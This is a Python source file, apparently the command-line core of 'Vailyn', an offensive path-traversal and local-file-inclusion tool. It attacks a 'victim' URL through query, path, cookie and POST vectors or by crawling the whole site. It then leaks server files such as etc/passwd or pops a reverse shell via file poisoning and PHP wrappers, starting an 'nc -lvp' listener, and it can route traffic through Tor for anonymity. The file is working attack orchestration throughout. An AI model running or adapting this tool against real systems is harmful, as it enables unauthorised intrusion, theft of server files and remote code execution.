#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import subprocess
import treelib
import sys
import random
import datetime
import time
import os

import core.variables as variables

from math import factorial

from multiprocessing.pool import ThreadPool as Pool

from scrapy.crawler import CrawlerProcess

from core.colors import color, FAIL, lines

from core.variables import (
    payloadlist,
    nullchars,
    processes,
    cachedir,
    is_windows,
)

from core.config import TERMINAL, TERM_CMD_TYPE, ASCII_ONLY

from core.methods.list import (
    listsplit,
    listperm,
    gensplit,
)
from core.methods.select import (
    select,
    select_techniques,
    select_vectors,
)
from core.methods.tree import create_tree
from core.methods.attack import (
    phase1, phase2, lfi_rce, reset_counter
)
from core.methods.cookie import (
    read_cookie, dict_from_header
)
from core.methods.cache import load, save, parse_url
from core.methods.tor import enable_tor
from core.methods.loot import set_date
from core.methods.notify import notify
from core.methods.print import (
    table_print,
    table_entry_print,
)
from core.methods.crawler import (
    UrlSpider,
    crawler_arjun,
    crawler_query,
    crawler_path,
    crawler_cookie,
    crawler_post_plain,
    crawler_post_json,
)

from core.methods.error import ShellPopException

if ASCII_ONLY:
    from terminaltables import AsciiTable as SingleTable
else:
    from terminaltables import SingleTable


# initialize file tree
filetree = treelib.Tree()
filetree.create_node(color.RB + "/" + color.END + color.RD, "root")


def cli_main(parser, opt, args, shell=True) -> int:
    """
    Vailyn's CLI interface.
     - parse rest of args
     - start attacks & print results
    """

    # are all globally required arguments given?
    if (
        not (opt["victim"] and opt["attack"]) or (
            args.attack.strip().lower() not in ["a", "p"]
            and not opt["phase2"]
            and not opt["nosploit"]
        )
    ):
        parser.print_help()
        sys.exit(
            "\n" + color.R + f"[{FAIL}]" + color.END + color.BOLD
            + " Invalid/missing params" + color.END + "\n"
            + color.RD + "[HINT]" + color.END + " -v, -a and -p2 mandatory"
        )

    loot = False
    victim2 = ""
    depth = 2
    verbose = variables.verbose
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []
    foundwrappers = []
    vlnfile = "etc/passwd"
    checkdepth = 8
    permutation_level = 2
    cookie_header = ""

    # handle optional arguments
    if opt["loot"]:
        loot = True

    if opt["vic2"]:
        victim2 = args.vic2

    if opt["depths"]:
        checkdepth = args.depths[0]
        depth = args.depths[1]
        permutation_level = args.depths[2]

    if opt["check"]:
        vlnfile = args.check

    if opt["cookie"]:
        cookie_header = args.cookie

    param = ""
    cookie = None
    post_data = ""
    selected = ""

    crawler_all = True

    if opt["tor"]:
        enable_tor()

    paysplit = listsplit(payloadlist, round(len(payloadlist) / processes))

    if args.attack.strip() == "1":
        """
        query mode (scan GET Parameter)
        """

        # is a query parameter to attack specified?
        if not opt["param"]:
            parser.print_help()
            sys.exit(
                "\n" + color.R + f"[{FAIL}]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -p mandatory for -a 1"
            )
        print("{0}[Vailyn]{1} PARAM{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))
        param = args.param
    elif args.attack.strip() == "2":
        """
        path mode (scan URL Path)
        """
        print("{0}[Vailyn]{1} PATH{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))
    elif args.attack.strip() == "3":
        """
        cookie mode (scan HTTP cookie)
        """
        print("{0}[Vailyn]{1} COOKIE{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))
    elif args.attack.strip() == "4":
        """
        POST mode, plain (scan POST/Form Data)
        """

        # is a POST data string specified?
        if not opt["param"]:
            parser.print_help()
            sys.exit(
                "\n" + color.R + f"[{FAIL}]" + color.END
                + color.BOLD + " Invalid/missing params"
                + color.END + "\n" + color.RD + "[HINT]" + color.END
                + " -p mandatory for -a 4"
            )
        print("{0}[Vailyn]{1} POST{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))

        # is the POST string specified sytactically correct?
        post_data = args.param
        if "INJECT" not in post_data:
            parser.print_help()
            sys.exit(
                "\n" + color.R + f"[{FAIL}]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -p needs to contain INJECT at injection point"
                + " for POST attack"
            )
        if "=" not in post_data:
            parser.print_help()
            sys.exit(
                "\n" + color.R + f"[{FAIL}]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -p needs to be of form P1=V1&P2=V2 for"
                + " POST attack"
            )
    elif args.attack.strip() == "5":
        """
        POST mode, json (scan POST/Form Data)
        """

        # is a POST JSON string specified?
        if not opt["param"]:
            parser.print_help()
            sys.exit(
                "\n" + color.R + f"[{FAIL}]" + color.END
                + color.BOLD + " Invalid/missing params"
                + color.END + "\n" + color.RD + "[HINT]" + color.END
                + " -p mandatory for -a 5"
            )
        print("{0}[Vailyn]{1} POST{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))

        # is the POST string specified sytactically correct?
        post_data = args.param
        if "INJECT" not in post_data:
            parser.print_help()
            sys.exit(
                "\n" + color.R + f"[{FAIL}]" + color.END + color.BOLD
                + " Invalid/missing params" + color.END + "\n"
                + color.RD + "[HINT]" + color.END
                + " -p needs to contain INJECT at injection point"
                + " for POST JSON attack"
            )
    elif args.attack.strip().lower() == "a":
        """
        crawler mode (scan every URL belonging to target with every vector)
        """
        print("{0}[Vailyn]{1}  ALL{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))
    elif args.attack.strip().lower() == "p":
        """
        custom crawler mode (scan every URL belonging to target with
        selected vectors)
        """
        print("{0}[Vailyn]{1}  ALL{2}{4}{3}".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            lines.VL,
        ))
        crawler_all = False
    else:
        # attack index not in range
        parser.print_help()
        sys.exit(
            "\n" + color.R + f"[{FAIL}]" + color.END + color.BOLD
            + " Invalid/missing params" + color.END + "\n" + color.RD
            + "[HINT]" + color.END + " -a needs to be in [1..5, A, P]"
        )

    try:
        # convert attack to digit used in logic
        args.attack = int(args.attack)
    except ValueError:
        # crawler mode
        args.attack = 0

    print("{0} {4}{1} {2}{3}vainly{1}".format(
        color.RD,
        color.END,
        color.CURSIVE,
        color.END + color.RC + color.BOLD,
        lines.SW,
    ))
    time.sleep(0.5)

    # print current and original IP if using Tor
    if variables.tor:
        print("\n{0}{7}{1}{6} IP{1}{0}{8}{1}{5} {2} {1}{4}>{1} {3}".format(
                color.RD, color.END, variables.initip, variables.torip,
                color.BOLD, color.CURSIVE, color.RB, " [TOR]", lines.VL,
            ))

    if args.attack == 0:
        time_slept = 0.0
        crawler_list = []
        if not crawler_all:
            crawler_list = select_vectors()
        crawlcookies = {}
        arjunjar = None
        # load authentication cookie for crawling
        if cookie_header != "":
            arjunjar = cookie_header
            crawlcookies = dict_from_header(arjunjar)

        """
        Crawler Phase 0:
         - fetch all links belonging to target
         - save in spider-phase0.txt
        """
        print(
            "\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} Link Spider\n".format(
                color.RD, color.END, lines.SWL, lines.NW,
            )
        )

        start_time = time.time()

        time.sleep(0.5)
        time_slept += 0.5
        ua = variables.user_agents[
            random.randrange(0, len(variables.user_agents))
        ]

        process = CrawlerProcess(
            {"USER_AGENT": ua, "LOG_ENABLED": False}
        )
        process.crawl(
            UrlSpider,
            cookiedict=crawlcookies,
            url=args.victim,
        )
        process.start()
        subdir = parse_url(args.victim)

        with open(cachedir + subdir + "spider-phase0.txt", "r") as vicfile:
            for line in vicfile:
                variables.viclist.append(line.strip())

        DATA = []
        for target in variables.viclist:
            DATA.append(table_print([target]))

        linkTable = SingleTable(DATA, "[ {}App Links{} ]".format(
            color.END, color.RD,
        ))
        linkTable.inner_heading_row_border = False
        print("{}{}{}".format(color.RD, linkTable.table, color.END))

        queryattack = {}
        if crawler_all or 1 in crawler_list:
            """
            Crawler Phase 1:
            - enumerate all HTTP GET parameters for each link
            - uses Arjun
            - save in spider-phase1.json
            """
            time.sleep(1)
            print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} {4}\n".format(
                color.RD, color.END, lines.SWL, lines.NW, "Param Enum (GET)",
            ))

            time.sleep(0.5)
            site_params = crawler_arjun(cookie_header=cookie_header)
            time.sleep(1)

            """
            Crawler Phase 2:
            - attack every GET parameter of every page
            - save in spider-phase2.json
            """
            print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} {4}\n".format(
                color.RD, color.END, lines.SWL, lines.NW, "Query Analysis",
            ))

            time.sleep(0.5)
            queryattack = crawler_query(
                site_params, victim2, verbose, checkdepth,
                vlnfile, cookie_header,
            )
            time_slept += 3.0

        pathattack = {}
        if crawler_all or 2 in crawler_list:
            """
            Crawler Phase 3:
            - attack every page using the path vector
            - duplicate paths only attacked once
            - save in spider-phase3.json
            """
            time.sleep(1)
            print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} {4}\n".format(
                color.RD, color.END, lines.SWL, lines.NW, "Path Analysis",
            ))

            time.sleep(0.5)
            pathattack = crawler_path(
                victim2, verbose, checkdepth, vlnfile, cookie_header,
            )
            time_slept += 1.5

        cookieattack = {}
        if crawler_all or 3 in crawler_list:
            """
            Crawler Phase 4:
            - attack every cookie found
            - save in spider-phase4.json
            """
            time.sleep(1)
            print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} {4}\n".format(
                color.RD, color.END, lines.SWL, lines.NW,
                "Cookie Analysis",
            ))

            time.sleep(0.5)
            cookieattack = crawler_cookie(
                victim2, verbose, checkdepth, vlnfile, cookie_header,
            )
            time_slept += 1.5

        post_attack = {}
        if crawler_all or 4 in crawler_list:
            """
            Crawler Phase 5:
            - enumerate all HTTP POST parameters (plain) for each link
            - uses Arjun
            - save in spider-phase5.json
            """
            time.sleep(1)
            print("\n{0}{4}[{1}Vailyn{0}]{1}\n{0}{3}{1} {2}\n".format(
                color.RD, color.END, "Param Enum (POST, plain)",
                lines.SWL, lines.NW,
            ))

            time.sleep(0.5)
            post_params = crawler_arjun(
                post=True, cookie_header=cookie_header,
            )
            time.sleep(1)

            """
            Crawler Phase 6:
            - attack every POST parameter of every page
            - save in spider-phase6.json
            """
            print("\n{0}{4}[{1}Vailyn{0}]{1}\n{0}{3}{1} {2}\n".format(
                color.RD, color.END, "POST Analysis, plain",
                lines.SWL, lines.NW,
            ))

            time.sleep(0.5)
            post_attack = crawler_post_plain(
                post_params, victim2, verbose, checkdepth,
                vlnfile, cookie_header,
            )
            time_slept += 3.0

        json_attack = {}
        if crawler_all or 5 in crawler_list:
            """
            Crawler Phase 7:
            - enumerate all HTTP POST parameters (JSON) for each link
            - uses Arjun
            - save in spider-phase7.json
            """
            time.sleep(1)
            print("\n{0}{4}[{1}Vailyn{0}]{1}\n{0}{3}{1} {2}\n".format(
                color.RD, color.END, "Param Enum (POST, json)",
                lines.SWL, lines.NW,
            ))

            time.sleep(0.5)
            json_params = crawler_arjun(
                jpost=True, cookie_header=cookie_header,
            )
            time.sleep(1)

            """
            Crawler Phase 8:
            - attack every POST parameter of every page
            - save in spider-phase8.json
            """
            print("\n{0}{4}[{1}Vailyn{0}]{1}\n{0}{3}{1} {2}\n".format(
                color.RD, color.END, "POST Analysis, json",
                lines.SWL, lines.NW,
            ))

            time.sleep(0.5)
            json_attack = crawler_post_json(
                json_params, victim2, verbose, checkdepth,
                vlnfile, cookie_header,
            )
            time_slept += 3.0

        time.sleep(2.5)
        time_slept += 2.5

        end_time = time.time()
        duration = end_time - start_time - time_slept  # remove sleeps
        readable_time = datetime.timedelta(seconds=duration)

        """
        Format & print results as tables
        """
        print("\n\n{0}[Vailyn]{1} SCAN{2}{6}{4} Finished in {5}{3}\n".format(
            color.RD,
            color.END + color.RB,
            color.END + color.RD,
            color.END,
            color.END + color.RC,
            readable_time,
            lines.VL,
        ))

        DATA = [table_print(
            ("URL", "Parameter", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in queryattack.items():
            for param, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, param, payloads, nullbytes, wrappers),
                ))

        query_table = SingleTable(
            DATA, "[ {}Query Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, query_table.table, color.END))

        DATA = [table_print(("URL", "Payloads", "Nullbytes", "Wrappers"))]
        for victim, pair in pathattack.items():
            payloads = table_entry_print(pair[0])
            nullbytes = table_entry_print(pair[1])
            wrappers = table_entry_print(pair[2])
            DATA.append(table_print(
                (victim, payloads, nullbytes, wrappers),
            ))

        path_table = SingleTable(
            DATA, "[ {}Path Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, path_table.table, color.END))

        DATA = [table_print(
            ("URL", "Cookie", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in cookieattack.items():
            for cname, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, cname, payloads, nullbytes, wrappers),
                ))

        cookie_table = SingleTable(
            DATA, "[ {}Cookie Attack{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, cookie_table.table, color.END))

        DATA = [table_print(
            ("URL", "Parameter", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in post_attack.items():
            for param, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, param, payloads, nullbytes, wrappers),
                ))

        post_table = SingleTable(
            DATA, "[ {}POST Attack, plain{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, post_table.table, color.END))

        DATA = [table_print(
            ("URL", "Parameter", "Payloads", "Nullbytes", "Wrappers"),
        )]
        for victim, sub in json_attack.items():
            for param, pair in sub.items():
                payloads = table_entry_print(pair[0])
                nullbytes = table_entry_print(pair[1])
                wrappers = table_entry_print(pair[2])
                DATA.append(table_print(
                    (victim, param, payloads, nullbytes, wrappers),
                ))

        json_table = SingleTable(
            DATA, "[ {}POST Attack, json{} ]".format(color.END, color.RD),
        )
        print("{}{}{}\n".format(color.RD, json_table.table, color.END))

        notify("Crawler finished scanning {} URLs.".format(
            len(variables.viclist),
        ))

        # exit program
        return

    # fetch and select cookie for cookie mode
    if args.attack == 3:
        print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} Parsing Cookie\n".format(
            color.RD, color.END, lines.SWL, lines.NW,
        ))
        cookie, selected = read_cookie(
            args.victim, auth_cookie=cookie_header,
        )

    print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} Analysis Phase\n".format(
        color.RD, color.END, lines.SWL, lines.NW,
    ))
    vlnysis = True

    # present option to skip phase 1 if cache from previous attack present
    targetcache = parse_url(args.victim)
    if (os.path.exists(cachedir + targetcache + "payloads.cache")
            and os.path.exists(cachedir + targetcache + "nullbytes.cache")
            and os.path.exists(cachedir + targetcache + "wrappers.cache")):
        choice = input(
            "{0}[?]{1}{2} Cache{1}{0}{3}{1} Load from".format(
                color.RD, color.END, color.RB, lines.VL,
            )
            + " previous attack?\n{0} {2}{1}".format(
                color.RD, color.END, lines.SW,
            )
            + " {1}enter if not{0} :> ".format(
                color.END, color.CURSIVE,
            ))
        if choice != "":
            vlnysis = False
            foundpayloads, foundnullbytes, foundwrappers = load(targetcache)
        else:
            print()

    if vlnysis:
        starting_time = time.time()
        # initiate phase 1 - vulnerability analysis
        reset_counter()
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase1, args=(
                        args.attack, args.victim, victim2, param, cookie,
                        selected, verbose, checkdepth, splitty, vlnfile,
                        cookie_header, post_data, None,
                )) for splitty in paysplit]
            for i in res:
                # fetch results
                tuples = i.get()
                foundpayloads += tuples[0]
                foundnullbytes += tuples[1]
                foundwrappers += tuples[2]

        ending_time = time.time()
        vuln_time = ending_time - starting_time
        # save working payloads to cache
        save(targetcache, foundpayloads, foundnullbytes, foundwrappers)
    else:
        vuln_time = 0.0

    # determine if phase 2 happens
    attack = False
    if foundpayloads:
        attack = True
        message = "Path Traversal detected!"
        if not args.nosploit:
            message += " Select Payloads for Phase 2"
        if vlnysis:
            notify(message)

        # select payloads for Phase 2
        selectedpayloads = select(
            foundpayloads, nosploit=args.nosploit,
        )
        if foundnullbytes:
            selectednullbytes = select(
                foundnullbytes, nullbytes=True, nosploit=args.nosploit,
            )
        else:
            selectednullbytes = []
        if foundwrappers:
            selectedwrappers = select(
                foundwrappers, wrappers=True, nosploit=args.nosploit,
            )
        else:
            selectedwrappers = []
    else:
        selectedwrappers = []
        if not opt["nosploit"]:
            notify("No payload succeeded. Attack anyways?")
            cont = input(
                "\n{0}[{2}]{1} No payload succeeded.".format(
                    color.RD, color.END, FAIL,
                )
                + " Attack anyways?\n{0} {2}{1} ".format(
                    color.RD, color.END, lines.SW,
                )
                + "{1}enter if not{0} :> ".format(
                    color.END, color.CURSIVE,
                )
            )
            if cont != "":
                attack = True
                # attack with everything if phase 1 was unsuccessful
                selectedpayloads = payloadlist
                selectednullbytes = nullchars
                selectedwrappers = [""]
                if variables.lfi:
                    selectedwrappers += variables.phase1_wrappers

    # skip phase 2 if --nosploit specified
    if opt["nosploit"]:
        attack = False

    """
    ! selectedwrappers ALWAYS needs to contain the empty !
    ! string for the base attack to get executed         !
    """
    if not selectedwrappers:
        selectedwrappers = [""]

    # start the exploitation phase
    starting_time = time.time()

    techniques = []

    if attack:
        reset_counter()
        print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} Sploit Phase\n".format(
            color.RD, color.END, lines.SWL, lines.NW,
        ))
        if variables.revshell:
            """
            RCE Module - LFI only.

            Obtain a reverse shell through file poisoning
            and PHP wrappers
            """
            if is_windows:
                # Vailyn cannot start a listener automatically on Windows
                # TODO: add this as feature
                lis = input(
                    "[?] Are you listening on {}".format(
                        variables.LISTENIP,
                    )
                    + ", port {}? (enter if not) :> ".format(
                        variables.LISTENPORT,
                    )
                )
                if lis == "":
                    sys.exit(
                        "Please start a listener manually "
                        "before starting the attack.",
                    )
            else:
                listener_cmd = ["konsole", "-e"]
                if TERMINAL:
                    listener_cmd = TERMINAL
                cmd_str = [
                    "nc -lvp {}".format(variables.LISTENPORT),
                ]
                cmd_list = ["nc", "-lvp", variables.LISTENPORT]
                if TERM_CMD_TYPE.strip().upper() == "STRING":
                    listener_cmd += cmd_str
                else:
                    listener_cmd += cmd_list
                with open(os.devnull, "w") as DEVNULL:
                    subprocess.Popen(
                        listener_cmd,
                        close_fds=True,
                        stdout=DEVNULL,
                        stderr=subprocess.STDOUT,
                    )

            # select RCE techniques to use
            techniques = select_techniques()
            starting_time = time.time()

            # start attack
            try:
                lfi_rce(
                    techniques, args.attack, args.victim, victim2,
                    param, cookie, selected, verbose, selectedpayloads,
                    selectednullbytes, selectedwrappers, cookie_header,
                    post_data, depth,
                )
            except ShellPopException:
                pass
        elif variables.implant:
            # TODO
            print("{}[{}] {}not implemented.{}".format(
                color.RD, FAIL, color.END + color.CURSIVE, color.END,
            ))
        else:
            """
            Leak Module - LFI & Path Traversal.

            Retreive (opt. download) files on server
            using file & directory dictionaries
            """
            set_date()
            sdirlen = 0
            with open(args.phase2[2], "r") as f:
                sdirlen = sum(1 for line in f if line.rstrip()) + 1

            if opt["phase2"] and sdirlen > 100:
                print("{}  Preparing dictionaries...{}".format(
                    color.RC, color.END,
                ))

            dirlen2 = sdirlen
            felems = dirlen2 - 1
            i = 1
            while (i <= permutation_level):
                if 0 <= i + 1 and i + 1 <= felems:
                    cur = factorial(felems) / factorial(felems - i - 1)
                else:
                    cur = 0
                dirlen2 += cur
                i += 1
            dirlen = int(dirlen2)
            splitted = gensplit(
                listperm(args.phase2[2], permutation_level),
                round(dirlen / processes),
            )

            starting_time = time.time()
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(phase2, args=(
                    args.attack, args.victim, victim2,
                    param, cookie, selected, args.phase2[1],
                    slist, depth, verbose, loot,
                    selectedpayloads, selectednullbytes,
                    selectedwrappers, cookie_header, post_data,
                    dirlen, None,
                )) for slist in splitted]

                for i in res:
                    # fetch results
                    restuple = i.get()
                    foundfiles += restuple[0]
                    foundurls += restuple[1]

    ending_time = time.time()
    attack_time = ending_time - starting_time
    total_time = vuln_time + attack_time

    readable_time = datetime.timedelta(seconds=total_time)
    if not args.nosploit:
        notification = "Attack done in {}.".format(readable_time)
        if variables.revshell:
            pass
        else:
            mult = "" if (len(foundfiles) - 1) == 1 else "s"
            notification += " Found {} file{}.".format(
                len(foundfiles) - 1, mult,
            )
        notify(notification)

    # display found files in a file tree
    print("\n{0}{3}[{1}Vailyn{0}]{1}\n{0}{2}{1} Directory Tree\n".format(
        color.RD, color.END, lines.SWL, lines.NW,
    ))
    if foundfiles:
        create_tree(filetree, foundfiles)
        if ASCII_ONLY:
            filetree.show(line_type="ascii")
        else:
            filetree.show(line_type="ascii-ex")
    if not foundurls:
        print("nothing found")

    print("{}Scan completed in {}.{}".format(color.RC, readable_time, color.END))
    if variables.tor and not is_windows:
        stop = input(
            color.END + " [?] Do you want to terminate the",
            " Tor service? (enter if not) :> "
        )
        if stop != "":
            try:
                subprocess.run(["systemctl", "stop", "tor"])
            except OSError:
                subprocess.run(["service", "tor", "stop"])
            except OSError:
                subprocess.run(["brew", "services", "stop", "tor"])
            except Exception as e:
                sys.exit(e)
